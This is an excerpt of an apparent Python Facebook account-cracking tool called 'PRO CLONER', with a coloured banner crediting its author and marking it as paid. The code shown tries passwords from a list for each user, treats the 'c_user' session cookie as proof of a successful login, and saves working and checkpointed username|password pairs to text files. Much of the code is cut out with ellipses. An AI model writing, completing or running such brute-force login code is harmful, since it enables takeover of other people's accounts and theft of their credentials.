...
██   ████  ██████  ██   ████  ██████  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Name \x1b[1;97m : \033[1;37m           PRO CLONER
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m        AGUNG Xzh
\033[1;31m\033[1;37m TIPE\x1b[1;97m  : \033[1;37m             PAID
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [PRO-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('PRO_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        pass
                    print('\r%s SADLIFE[-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SADlife_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
